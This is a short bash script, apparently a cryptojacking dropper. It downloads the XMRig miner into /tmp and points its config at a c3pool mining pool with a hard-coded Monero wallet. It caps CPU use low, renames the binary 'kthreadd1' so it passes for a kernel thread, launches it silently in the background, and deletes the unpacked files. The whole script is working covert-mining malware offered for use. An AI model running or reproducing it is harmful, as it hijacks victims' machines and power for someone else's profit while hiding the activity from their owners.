#!/bin/bash
cd /tmp
wget https://github.com/xmrig/xmrig/releases/download/v2.14.1/xmrig-2.14.1-xenial-x64.tar.gz
tar xvf xmrig-2.14.1-xenial-x64.tar.gz
cd  xmrig-2.14.1
sed -i "s/donate.v2.xmrig.com:3333/mine.c3pool.com:13333/g" config.json
sed -i "s/YOUR_WALLET_ADDRESS/41tYfhLer7d4X923KmM7ZRTNeLpec1KYDC1bQjQmQiiPAjgmsVLnJkMP4VrXHj51KUMkSmKQsvozg5Wv5K5ZJ9DQ38ap9wL/g" config.json
sed -i "s/100/15/g" config.json
sed -i "s/\"x\"/\"`hostname`\"/g" config.json
mv xmrig kthreadd1
nohup ./kthreadd1  >/dev/null 2>&1 &
cd ..
sleep 30
rm -rf /tmp/xmrig-2.14.1 xmrig-2.14.1-xenial-x64.tar.gz
